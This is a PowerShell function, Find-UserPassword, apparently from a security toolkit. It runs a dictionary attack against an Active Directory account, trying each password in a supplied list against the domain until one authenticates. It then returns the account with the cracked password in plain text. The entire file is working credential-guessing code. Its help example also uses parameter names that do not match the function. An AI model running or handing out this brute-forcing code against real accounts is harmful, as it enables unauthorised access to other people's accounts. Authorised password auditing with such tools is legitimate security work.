Set-StrictMode -Version 2

function Find-UserPassword
{
    	<#
		.SYNOPSIS

        .DESCRIPTION
		
		.PARAMETER Identity
		Active Directory Identity.
	
		.PARAMETER PasswordFile
		Password list/file.
	
		.EXAMPLE
        Find-UserPassword -Identify kieran.jacobsen -Password c:\passwordlist.txt
	
		.INPUTS
        Microsoft.ActiveDirectory.Management.ADUser.
	
		.OUTPUTS
		System.Boolean.

		.LINK
        http://poshsecurity.com
	#>

    [CmdletBinding()]
    [OutputType("PSCredential", [System.Boolean])]
    Param
    (
        [Parameter(Mandatory = $True, valuefrompipeline = $true)]
        [ValidateNotNullOrEmpty()]
        [Microsoft.ActiveDirectory.Management.ADUser]
        $Identity,

        [Parameter(Mandatory = $True, ParameterSetName='PasswordFile')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({Test-Path $_})]
        [String]
        $PasswordFile
    )

    Begin
    {
        Write-Verbose -Message "Using Password File $PasswordFile"
        $Passwords = Get-Content -Path $PasswordFile
        
        $TotalPasswords =  ($passwords | Measure-Object).count

        Write-Verbose -Message "Total Passwords is $TotalPasswords"
        
        if ($TotalPasswords -eq 0)
        { throw "No Passwords Provided" }
    }

    Process 
    {
        $User = Get-ADUser -Identity $Identity
        Write-Verbose -Message "Testing Passwords for user $( $User.SamAccountName )"
        
        $PasswordsProcessed = 0
        $PasswordFound = $false

        While ((-not $PasswordFound) -and ($PasswordsProcessed -le $TotalPasswords))
        {            
            if ($TotalPasswords -ne 1) 
            { 
                $PasswordPercentage = $PasswordsProcessed / $TotalPasswords * 100
                Write-Progress -Activity 'Testing Password' -PercentComplete $PasswordPercentage -Status "$PasswordPercentage % Complete" -ParentId 1 
            }
            $PasswordAttempt = $Passwords[($PasswordsProcessed )]
            Write-Verbose -Message "Attempting password $PasswordAttempt"

            $SecureStringPassword = ConvertTo-SecureString -String $PasswordAttempt -AsPlainText -Force
            $PasswordFound = Test-UserCredential -Username $User.SamAccountName -Password $SecureStringPassword -Domain

            $PasswordsProcessed++
        }

        if ($TotalPasswords -ne 1) 
        { Write-Progress -Activity 'Testing Password' -ParentId 1 -Completed }

        if (-not $PasswordFound) 
        { $PasswordAttempt = '<> Password Not Found <>' }

        # Update the pipelined object
        $ReturnUser = $User | Add-Member -NotePropertyName PasswordFound -NotePropertyValue $PasswordFound -Force -PassThru 
        $ReturnUser = $User | Add-Member -NotePropertyName Password -NotePropertyValue $PasswordAttempt -Force -PassThru

        $ReturnUser
    }
    
}


